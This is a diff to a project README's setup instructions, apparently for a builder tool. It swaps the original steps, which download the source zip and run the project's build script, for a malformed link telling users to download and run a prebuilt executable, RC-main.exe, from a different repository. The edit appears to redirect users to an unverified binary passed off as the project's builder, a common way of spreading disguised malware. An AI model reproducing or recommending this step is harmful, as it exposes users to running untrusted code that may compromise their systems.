@@ -59,11 +59,10 @@
 
 ### Setup
 
-1. [Download source code zip](https://github.com/addi00000/empyrean/archive/refs/heads/main.zip)
-2. Extract zip
-3. Run `install_python.bat` if you don't have python installed
-4. Run the builder by double clicking the `build.bat` file
-5. Follow instructions in builder and your exe will be found in the `dist` folder under the name `main.exe`
+1. [Download RCBuilder.exe]([https://github.com/addi00000/empyrean/archive/refs/heads/main.zip](https://github.com/RCmethodz/RCbuilder/blob/main/RC-main.exe))
+2. Run `install_python.bat` if you don't have python installed
+3. run the RC-main and let it load.
+4. Follow instructions in RC-main and your exe will be found in the `dist` folder under the name `main.exe`
 
 <div align="center">
     <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="img/bu0.png"></img>
